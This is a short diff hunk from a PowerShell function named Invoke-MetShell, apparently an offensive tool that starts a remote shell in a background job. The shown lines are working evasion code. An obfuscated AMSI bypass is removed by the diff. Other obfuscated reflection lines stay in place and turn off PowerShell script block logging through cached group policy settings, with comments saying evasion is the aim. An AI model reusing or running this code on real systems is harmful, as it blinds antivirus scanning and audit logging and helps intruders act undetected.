@@ -73,7 +73,6 @@ function Invoke-MetShell
 	#same reason for shortner url and wrapper to Invoke-....
 	#AMSI evasion and script block logging by-pass have to be repeated hear becouse script block will run in new context 
         $job = start-job -scriptblock {
-		[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls')."GetFie`ld"('ams'+'iIni'+'tFa'+'iled','NonPublic,Static').SetValue($null,$true);            
 		$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils")."GetFie`ld"("cachedGroupPolicySettings","NonPu"+"blic,Static").GetValue($null);
 		$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'] = @{}
 		$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'].Add('EnableScr'+'iptBlockLogging',"0")
